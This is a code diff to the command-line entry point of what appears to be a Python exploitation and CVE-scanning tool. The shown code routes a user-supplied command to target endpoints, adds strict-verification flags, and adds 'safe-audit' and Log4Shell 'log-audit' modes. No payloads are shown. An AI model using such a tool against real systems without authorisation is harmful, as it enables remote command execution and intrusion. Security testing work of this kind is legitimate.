+    log_parser = subparsers.add_parser('log-audit', help='Safe Log2Shell/Log4Shell risk audit')
+    log_parser.add_argument('target_url', help='Target URL to audit')
+    log_parser.add_argument('-o', '--output', help='Optional JSON output file path')
     
     # Menu mode
     subparsers.add_parser('menu', help='Start interactive menu')
@@ -2552,13 +3087,16 @@ Examples:
     
     # Seed random for better randomness
     random.seed(time.time())
+
+    configure_runtime_security(insecure=args.insecure, verbose_errors=args.verbose_errors)
     
     # Set global timeout
     import socket
     socket.setdefaulttimeout(15)
     
     # Additional safety measures
-    os.environ['PYTHONWARNINGS'] = 'ignore'
+    if args.insecure:
+        os.environ['PYTHONWARNINGS'] = 'ignore'
     
     try:
         if args.mode == 'scan':
@@ -2594,7 +3132,8 @@ Examples:
                         target_url=args.target_url,
                         endpoint=endpoint_url,
                         command=args.command,
-                        aggressive=args.aggressive
+                        aggressive=args.aggressive,
+                        strict_verify=(not args.no_strict_verify)
                     )
                 else:
                     # Проверяем все endpoints
@@ -2616,12 +3155,13 @@ Examples:
                                 target_url=args.target_url,
                                 endpoint=endpoint_url,
                                 command=args.command,
-                                aggressive=args.aggressive
+                                aggressive=args.aggressive,
+                                strict_verify=(not args.no_strict_verify)
                             )
                             time.sleep(0.5)
                     elif args.test_all:
                         # Тестируем все endpoints без подтверждения
-                        exploit_all_endpoints(args.target_url, args.command, args.aggressive)
+                        exploit_all_endpoints(args.target_url, args.command, args.aggressive, strict_verify=(not args.no_strict_verify))
                     else:
                         # Автоматический поиск рабочих endpoints
                         print(f"[+] Auto-detecting working endpoints for {args.target_url}")
@@ -2637,7 +3177,8 @@ Examples:
                                     endpoint=ep['url'],
                                     method=ep.get('method', 'POST'),
                                     command=args.command,
-                                    aggressive=args.aggressive
+                                    aggressive=args.aggressive,
+                                    strict_verify=(not args.no_strict_verify)
                                 )
                                 time.sleep(0.5)
                         else:
@@ -2651,7 +3192,7 @@ Examples:
                             choice = input("\nSelect option (1/2/3): ").strip()
                             
                             if choice == '1':
-                                exploit_all_endpoints(args.target_url, args.command, args.aggressive)
+                                exploit_all_endpoints(args.target_url, args.command, args.aggressive, strict_verify=(not args.no_strict_verify))
                             elif choice == '2':
                                 common_endpoints = [
                                     "/api/graphql",
@@ -2668,7 +3209,8 @@ Examples:
                                         target_url=args.target_url,
                                         endpoint=endpoint_url,
                                         command=args.command,
-                                        aggressive=args.aggressive
+                                        aggressive=args.aggressive,
+                                        strict_verify=(not args.no_strict_verify)
                                     )
                                     time.sleep(0.5)
                             elif choice == '3':
@@ -2683,13 +3225,38 @@ Examples:
                                         target_url=args.target_url,
                                         endpoint=endpoint_url,
                                         command=args.command,
-                                        aggressive=args.aggressive
+                                        aggressive=args.aggressive,
+                                        strict_verify=(not args.no_strict_verify)
                                     )
                             else:
                                 print("[!] Invalid choice")
         
         elif args.mode == 'cve-scan':
             mass_cve_scan(args.input_file, args.output, threads=args.threads)
+
+        elif args.mode == 'safe-audit':
+            safe_results = safe_full_audit(args.target_url)
+            if args.output:
+                with open(args.output, 'w') as f:
+                    json.dump({
+                        'scan_date': datetime.now().isoformat(),
+                        'target': args.target_url,
+                        'mode': 'safe-audit',
+                        'results': safe_results,
+                    }, f, indent=2)
+                print(f"[+] Safe audit report saved: {args.output}")
+
+        elif args.mode == 'log-audit':
+            log_results = safe_log_audit(args.target_url)
+            if args.output:
+                with open(args.output, 'w') as f:
+                    json.dump({
+                        'scan_date': datetime.now().isoformat(),
+                        'target': args.target_url,
+                        'mode': 'log-audit',
+                        'results': log_results,
+                    }, f, indent=2)
+                print(f"[+] Log audit report saved: {args.output}")
         
         elif args.mode == 'menu':
             main_menu()
